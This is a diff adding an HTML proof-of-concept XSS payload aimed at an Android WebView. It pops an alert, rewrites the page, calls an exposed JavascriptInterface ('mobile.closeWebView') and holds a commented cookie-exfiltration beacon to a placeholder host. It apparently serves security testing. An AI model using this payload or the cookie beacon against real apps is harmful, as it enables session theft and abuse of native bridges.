@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test</title>
+    <script>
+        // Payload 1: Display an alert to confirm JavaScript execution
+        alert("XSS Successful! Domain: " + document.domain + "\nUser Agent: " + navigator.userAgent);
+
+        // Payload 2: Change the content of the page to visually confirm XSS
+        document.body.innerHTML = "<h1>!!! XSS CONFIRMED !!!</h1><p>Malicious JavaScript executed within the WebView.</p>";
+
+        // Payload 3: Attempt to call the exposed JavascriptInterface 'mobile.closeWebView()'
+        // This should immediately close the WebView.
+        try {
+            console.log("Attempting to call window.mobile.closeWebView()");
+            window.mobile.closeWebView();
+        } catch (e) {
+            console.error("Error calling closeWebView: ", e);
+            document.body.innerHTML += "<p>Error calling closeWebView: " + e.message + "</p>";
+        }
+
+        // You could also try to exfiltrate data (e.g., cookies if they exist)
+        // new Image().src = "http://YOUR_LOCAL_IP:8000/log_cookie?cookie=" + document.cookie; // Requires a server-side handler to log this
+    </script>
+    <style>
+        body { background-color: #f0f0f0; color: red; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        h1 { font-size: 2em; }
+    </style>
+</head>
+<body>
+    <h1>Loading XSS Payload...</h1>
+    <p>If you see this, the WebView is attempting to load content.</p>
+</body>
+</html>
